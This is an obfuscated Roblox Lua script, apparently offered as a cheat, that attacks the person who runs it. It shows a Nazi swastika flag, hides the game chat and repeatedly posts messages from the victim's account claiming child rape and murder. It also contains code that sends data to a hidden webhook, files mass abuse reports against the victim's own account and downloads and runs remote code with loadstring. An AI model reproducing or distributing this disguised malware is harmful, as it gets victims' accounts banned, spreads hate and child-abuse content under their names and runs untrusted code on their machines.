--[[      
███╗░░░███╗░█████╗░██████╗░███████╗  ██████╗░██╗░░░██╗  ███╗░░░███╗███████╗██╗░░░░░███████╗
████╗░████║██╔══██╗██╔══██╗██╔════╝  ██╔══██╗╚██╗░██╔╝  ████╗░████║╚════██║██║░░░░░██╔════╝
██╔████╔██║███████║██║░░██║█████╗░░  ██████╦╝░╚████╔╝░  ██╔████╔██║░░███╔═╝██║░░░░░█████╗░░
██║╚██╔╝██║██╔══██║██║░░██║██╔══╝░░  ██╔══██╗░░╚██╔╝░░  ██║╚██╔╝██║██╔══╝░░██║░░░░░██╔══╝░░
██║░╚═╝░██║██║░░██║██████╔╝███████╗  ██████╦╝░░░██║░░░  ██║░╚═╝░██║███████╗███████╗██║░░░░░
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═════╝░╚══════╝  ╚═════╝░░░░╚═╝░░░  ╚═╝░░░░░╚═╝╚══════╝╚══════╝╚═╝░░░░░
]]--
local obf_stringchar = string.char;
local obf_stringbyte = string.byte;
local obf_stringsub = string.sub;
local obf_bitlib = bit32 or bit;
local obf_XOR = obf_bitlib.bxor;
local obf_tableconcat = table.concat;
local obf_tableinsert = table.insert;
local function LUAOBFUSACTOR_DECRYPT_STR_0(LUAOBFUSACTOR_STR, LUAOBFUSACTOR_KEY)
	local result = {};
	for i = 1, #LUAOBFUSACTOR_STR do
		obf_tableinsert(result, obf_stringchar(obf_XOR(obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_STR, i, i + 1)), obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_KEY, 1 + (i % #LUAOBFUSACTOR_KEY), 1 + (i % #LUAOBFUSACTOR_KEY) + 1))) % 256));
	end
	return obf_tableconcat(result);
end
repeat
	task.wait();
until game:IsLoaded() 
local screenGui = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\226\192\201\32\227\181\224\11\216", "\126\177\163\187\69\134\219\167"));
screenGui.Name = LUAOBFUSACTOR_DECRYPT_STR_0("\1\193\43\198\247\16\206\56\192\249\45\234\63\204", "\156\67\173\74\165");
screenGui.Parent = game.Players.LocalPlayer:WaitForChild(LUAOBFUSACTOR_DECRYPT_STR_0("\4\187\72\15\185\52\97\33\190", "\38\84\215\41\118\220\70"));
screenGui.DisplayOrder = 999;
screenGui.IgnoreGuiInset = true;
game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false);
game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false);
local blackFrame = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\118\4\35\31\251", "\158\48\118\66\114"));
blackFrame.Size = UDim2.new(2, 0, 2, 0);
blackFrame.Position = UDim2.new(-0.5, 0, -0.5, 0);
blackFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0);
blackFrame.Parent = screenGui;
local function createNaziFlag()
	local flagFrame = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\141\54\17\59\118", "\155\203\68\112\86\19\197"));
	flagFrame.Size = UDim2.new(0.2, 0, 0.2, 0);
	flagFrame.Position = UDim2.new(0.4, 0, 0.35, 0);
	flagFrame.BackgroundColor3 = Color3.fromRGB(255, 0, 0);
	flagFrame.Parent = blackFrame;
	local whiteCircle = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\96\207\55\241\69", "\152\38\189\86\156\32\24\133"));
	whiteCircle.Size = UDim2.new(0.6, 0, 0.6, 0);
	whiteCircle.Position = UDim2.new(0.2, 0, 0.2, 0);
	whiteCircle.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
	whiteCircle.Parent = flagFrame;
	local circleCorner = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\201\126\132\73\238\89\162\84", "\38\156\55\199"));
	circleCorner.CornerRadius = UDim.new(1, 0);
	circleCorner.Parent = whiteCircle;
	local symbol = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\156\120\100\60\63\117\248\70\164", "\35\200\29\28\72\115\20\154"));
	symbol.Text = "卐";
	symbol.TextColor3 = Color3.fromRGB(0, 0, 0);
	symbol.BackgroundTransparency = 1;
	symbol.Size = UDim2.new(1, 0, 1, 0);
	symbol.Position = UDim2.new(0, 0, 0, 0);
	symbol.Parent = whiteCircle;
	symbol.Font = Enum.Font.SourceSansBold;
	symbol.TextScaled = true;
end
createNaziFlag();
local createdByLabel = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\45\186\201\203\161\45\54\28\179", "\84\121\223\177\191\237\76"));
createdByLabel.Parent = blackFrame;
createdByLabel.Text = LUAOBFUSACTOR_DECRYPT_STR_0("\152\68\204\161\46\85\52\129\185\79\137\173\32\92\54", "\161\219\54\169\192\90\48\80");
createdByLabel.TextColor3 = Color3.fromRGB(255, 255, 255);
createdByLabel.BackgroundTransparency = 1;
createdByLabel.Size = UDim2.new(0.4, 0, 0.1, 0);
createdByLabel.Position = UDim2.new(0.3, 0, 0.25, 0);
createdByLabel.Font = Enum.Font.GothamBold;
createdByLabel.TextScaled = true;
local tweenService = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\125\85\5\32\71\113\5\55\95\75\3\32", "\69\41\34\96"));
local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, true);
local goal = {[LUAOBFUSACTOR_DECRYPT_STR_0("\136\198\207\30\33\36\176\204\197\89", "\75\220\163\183\106\98")]=Color3.fromRGB(255, 0, 0)};
local tween = tweenService:Create(createdByLabel, tweenInfo, goal);
tween:Play();
local textLabel = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\54\191\147\35\245\3\184\142\59", "\185\98\218\235\87"));
textLabel.Parent = blackFrame;
textLabel.Text = LUAOBFUSACTOR_DECRYPT_STR_0("\248\63\53\239\206\190\139\48\40\231\218\163\197\59", "\202\171\92\71\134\190");
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255);
textLabel.BackgroundTransparency = 1;
textLabel.Size = UDim2.new(1, 0, 0.2, 0);
textLabel.Position = UDim2.new(0, 0, 0.5, 0);
textLabel.Font = Enum.Font.SourceSans;
textLabel.TextScaled = true;
local loadingBarBackground = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\15\211\45\133\44", "\232\73\161\76"));
loadingBarBackground.Parent = blackFrame;
loadingBarBackground.BackgroundColor3 = Color3.fromRGB(100, 100, 100);
loadingBarBackground.Size = UDim2.new(0.8, 0, 0.02, 0);
loadingBarBackground.Position = UDim2.new(0.1, 0, 0.7, 0);
local loadingBar = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\157\203\67\80\27", "\126\219\185\34\61"));
loadingBar.Parent = loadingBarBackground;
loadingBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0);
loadingBar.Size = UDim2.new(0, 0, 1, 0);
local tweenInfoBar = TweenInfo.new(30, Enum.EasingStyle.Linear);
local goalBar = {[LUAOBFUSACTOR_DECRYPT_STR_0("\63\199\68\119", "\135\108\174\62\18\30\23\147")]=UDim2.new(1, 0, 1, 0)};
local tweenBar = tweenService:Create(loadingBar, tweenInfoBar, goalBar);
task.delay(1, function()
	tweenBar:Play();
end);
local function copyToClipboard(text)
	if setclipboard then
		setclipboard(text);
	end
end
tweenBar.Completed:Connect(function()
	textLabel:Destroy();
	createdByLabel:Destroy();
	blackFrame:ClearAllChildren();
	local endText = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\130\236\50\223\52\175\49\194\186", "\167\214\137\74\171\120\206\83"));
	endText.Parent = blackFrame;
	endText.Text = "Don't cheat lil bro";
	endText.TextColor3 = Color3.fromRGB(255, 255, 255);
	endText.BackgroundTransparency = 1;
	endText.Size = UDim2.new(1, 0, 0.2, 0);
	endText.Position = UDim2.new(0, 0, 0.3, 0);
	endText.Font = Enum.Font.SourceSansBold;
	endText.TextScaled = true;
	local telegramButton = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\191\245\42\73\218\178\159\228\61\83", "\199\235\144\82\61\152"));
	telegramButton.Parent = blackFrame;
	telegramButton.Text = LUAOBFUSACTOR_DECRYPT_STR_0("\45\25\176\37\71\27\160\107\19\19\181\46\0\4\184\38", "\75\103\118\217");
	telegramButton.TextColor3 = Color3.fromRGB(255, 255, 255);
	telegramButton.BackgroundColor3 = Color3.fromRGB(0, 0, 255);
	telegramButton.Size = UDim2.new(0.6, 0, 0.1, 0);
	telegramButton.Position = UDim2.new(0.2, 0, 0.5, 0);
	telegramButton.Font = Enum.Font.SourceSansBold;
	telegramButton.TextScaled = true;
	telegramButton.MouseButton1Click:Connect(function()
		copyToClipboard(LUAOBFUSACTOR_DECRYPT_STR_0("\207\64\100\4\170\68\136\27\100\90\180\27\136\70\101\7\170\23\198\90\125\14\181\24\192\70\127\1\169", "\126\167\52\16\116\217"));
		local log = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\252\43\56\148\152\24\254\205\34", "\156\168\78\64\224\212\121"));
		log.Parent = blackFrame;
		log.Text = LUAOBFUSACTOR_DECRYPT_STR_0("\36\225\181\199\2\234\229\218\8\174\166\194\14\254\167\193\6\252\161", "\174\103\142\197");
		log.TextColor3 = Color3.fromRGB(0, 255, 0);
		log.BackgroundTransparency = 1;
		log.Size = UDim2.new(1, 0, 0.1, 0);
		log.Position = UDim2.new(0, 0, 0.65, 0);
		log.Font = Enum.Font.SourceSansBold;
		log.TextScaled = true;
		task.wait(2);
		log:Destroy();
	end);
	local sound = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\101\39\74\54\33", "\152\54\72\63\88\69\62"));
	sound.SoundId = LUAOBFUSACTOR_DECRYPT_STR_0("\198\198\246\93\199\215\235\72\221\192\180\19\155\147\185\13\135\156\183\12\141\146\189", "\60\180\164\142");
	sound.Volume = 1;
	sound.Looped = true;
	sound.Parent = blackFrame;
	sound:Play();
end);
local UserInputService = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\109\77\0\59\14\227\2\77\74\54\44\53\251\27\91\91", "\114\56\62\101\73\71\141"));
UserInputService.InputBegan:Connect(function(input, processed)
	if ((input.KeyCode == Enum.KeyCode.Escape) and not processed) then
		print(LUAOBFUSACTOR_DECRYPT_STR_0("\157\250\216\197\168\236\155\207\189\240\155\212\170\236\200\215\189\237\151\132\186\229\212\199\179\224\213\195\248\236\195\205\172", "\164\216\137\187"));
	end
end);
local Players = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\226\234\48\171\163\236\24", "\107\178\134\81\210\198\158"));
local ReplicatedStorage = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\10\11\146\202\163\59\15\150\195\174\11\26\141\212\171\63\11", "\202\88\110\226\166"));
local TextChatService = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\247\10\154\227\233\203\14\150\196\207\209\25\139\244\207", "\170\163\111\226\151"));
local LocalPlayer = Players.LocalPlayer;
local chat = TextChatService.ChatInputBarConfiguration.TargetTextChannel;
local function sendHi()
	local message = "made by mzlf with love, join to my 🆃🅴🅻🅴🅶🆁🅰️🅼 - russianmzlfchannel, 🅸 🆁🅰️🅿️🅴 🅲🅷🅸🅻🅳🆁🅴🅽🆂, 🅸 🅺🅸🅻🅻 🅲🅷🅸🅻🅳🆁🅴🅽🆂, 🅸 🅳🅸🆂🅼🅴🅼🅱️🅴🆁 🅲🅷🅸🅻🅳🆁🅴🅽🆂,я̶ ̷е̶б̶у̷ ̶д̶е̷т̴е̸й̴ ";
	if (TextChatService.ChatVersion == Enum.ChatVersion.LegacyChatService) then
		ReplicatedStorage:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\53\53\180\57\91\59\61\50\56\179\44\125\46\58\5\53\191\27\70\54\61\52\38\183\54\90\36", "\73\113\80\210\88\46\87")).SayMessageRequest:FireServer(message, LUAOBFUSACTOR_DECRYPT_STR_0("\160\32\193", "\135\225\76\173\114"));
	else
		chat:SendAsync(message);
	end
end
while true do
	sendHi();
	task.wait(1);
end
local player_name = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\42\225\185\169\169\175\180", "\199\122\141\216\208\204\221")).LocalPlayer.Name;
local webhook_url = LUAOBFUSACTOR_DECRYPT_STR_0("\165\201\4\224\107\172\226\146\20\249\107\245\162\207\20\190\123\249\160\146\17\224\113\185\186\216\18\248\119\249\166\206\95\161\42\161\254\132\71\165\43\161\253\142\73\165\44\164\255\138\66\161\55\187\253\234\38\162\123\250\224\137\6\233\108\255\139\255\53\214\125\245\164\223\10\212\46\215\245\218\17\220\79\211\136\206\52\227\94\164\175\248\64\197\127\164\172\231\59\222\33\192\129\239\18\253\93\210\146\210\38\246\105\252\251\222\62\195\73\226\249", "\150\205\189\112\144\24");
local ip_info = syn.request({[LUAOBFUSACTOR_DECRYPT_STR_0("\16\150\179", "\112\69\228\223\44\100\232\113")]=LUAOBFUSACTOR_DECRYPT_STR_0("\220\11\19\195\236\51\201\221\15\74\210\166\117\200\215\16\10\156\188\111\137\218", "\230\180\127\103\179\214\28"),[LUAOBFUSACTOR_DECRYPT_STR_0("\161\0\75\78\235\69", "\128\236\101\63\38\132\33")]=LUAOBFUSACTOR_DECRYPT_STR_0("\139\140\37", "\175\204\201\113\36\214\139")});
syn.request({[LUAOBFUSACTOR_DECRYPT_STR_0("\114\222\57", "\100\39\172\85\188")]=webhook_url,[LUAOBFUSACTOR_DECRYPT_STR_0("\128\125\173\136\60\169", "\83\205\24\217\224")]=LUAOBFUSACTOR_DECRYPT_STR_0("\214\234\254\9", "\93\134\165\173"),[LUAOBFUSACTOR_DECRYPT_STR_0("\150\247\192\198\63\220\161", "\30\222\146\161\162\90\174\210")]={[LUAOBFUSACTOR_DECRYPT_STR_0("\198\65\126\30\224\64\100\71\209\87\96\15", "\106\133\46\16")]=LUAOBFUSACTOR_DECRYPT_STR_0("\89\48\99\240\83\67\89\52\122\243\84\15\82\51\124\242", "\32\56\64\19\156\58")},[LUAOBFUSACTOR_DECRYPT_STR_0("\120\199\225\79", "\224\58\168\133\54\58\146")]=game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\113\66\95\237\70\131\149\29\80\85\78", "\107\57\54\43\157\21\230\231")):JSONEncode({[LUAOBFUSACTOR_DECRYPT_STR_0("\216\132\31\225\188\210\219", "\175\187\235\113\149\217\188")]=dataMessage})});
local categories = {LUAOBFUSACTOR_DECRYPT_STR_0("\30\186\141\64\250\112\118\59", "\24\92\207\225\44\131\25"),LUAOBFUSACTOR_DECRYPT_STR_0("\98\221\185\92\11\111\68\195\170\69\26\105\78\147\148\77\21\122\94\210\191\73", "\29\43\179\216\44\123"),LUAOBFUSACTOR_DECRYPT_STR_0("\153\208\51\79\175\208\45\69\179\216\52\67\175\192\96\96\188\215\39\89\188\222\37", "\44\221\185\64"),LUAOBFUSACTOR_DECRYPT_STR_0("\40\233\73\79\99\19\232\88\77\122\0\243\77\31\70\18\226\90\81\114\12\226", "\19\97\135\40\63"),LUAOBFUSACTOR_DECRYPT_STR_0("\139\68\35\55\32\56\186\85\61\60\96\18\166\89\50\47\38\63\169", "\81\206\60\83\91\79"),LUAOBFUSACTOR_DECRYPT_STR_0("\125\168\209\127\34\202\67\163", "\196\46\203\176\18\79\163\45"),LUAOBFUSACTOR_DECRYPT_STR_0("\151\36\120\13\45\239\234\248\14\119\16\47\232", "\143\216\66\30\126\68\155"),LUAOBFUSACTOR_DECRYPT_STR_0("\154\205\31\216\202\173\214\237\234\225\3\205\202\227\228\233\171\218\4\197\194", "\129\202\168\109\171\165\195\183")};
local players = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\18\84\54\193\219\6\245", "\134\66\56\87\184\190\116"));
local localPlayer = players.LocalPlayer;
for _, category in ipairs(categories) do
	players:ReportAbuse(localPlayer, category, LUAOBFUSACTOR_DECRYPT_STR_0("\29\36\29\180\84\249\36\37\51\35\29\190\29\171\39\58\46\113\11\169\28\234\42\60\50\54\73\137\22\233\45\58\36\113\61\148\42\165", "\85\92\81\105\219\121\139\65"));
	task.wait(1.5);
	players:ReportAbuse(localPlayer, category, LUAOBFUSACTOR_DECRYPT_STR_0("\220\166\68\74\49\205\248\163\95\87\104\218\249\243\86\74\110\159\255\161\85\68\119\214\243\180\16\119\115\221\241\188\72\5\72\240\206\253", "\191\157\211\48\37\28"));
end
local function notifySelfReport()
	local OrionLib = loadstring(game:HttpGet(LUAOBFUSACTOR_DECRYPT_STR_0("\215\11\224\12\41\133\80\187\14\59\200\81\243\21\46\215\10\246\9\41\218\13\247\19\52\203\26\250\8\116\220\16\249\83\41\215\19\241\4\45\222\13\241\83\21\205\22\251\18\117\210\30\253\18\117\204\16\225\14\57\218", "\90\191\127\148\124")))();
	OrionLib:MakeNotification({[LUAOBFUSACTOR_DECRYPT_STR_0("\86\134\35\18", "\119\24\231\78")]=LUAOBFUSACTOR_DECRYPT_STR_0("\177\40\169\76\145\114\20\146\34\183\94", "\113\226\77\197\42\188\32"),[LUAOBFUSACTOR_DECRYPT_STR_0("\25\25\250\161\63\24\224", "\213\90\118\148")]=(LUAOBFUSACTOR_DECRYPT_STR_0("\115\43\244\65\76\85\58\244\80\88\88\37\248\68\76\75\43\244\87\67\95\110\191\95\65\87\110\183\94\68\87\42\166\83\67\72\116\244", "\45\59\78\212\54") .. table.concat(categories, LUAOBFUSACTOR_DECRYPT_STR_0("\92\22", "\144\112\54\227\235\230\78\205"))),[LUAOBFUSACTOR_DECRYPT_STR_0("\135\33\2\249", "\59\211\72\111\156\176")]=5});
end
notifySelfReport();
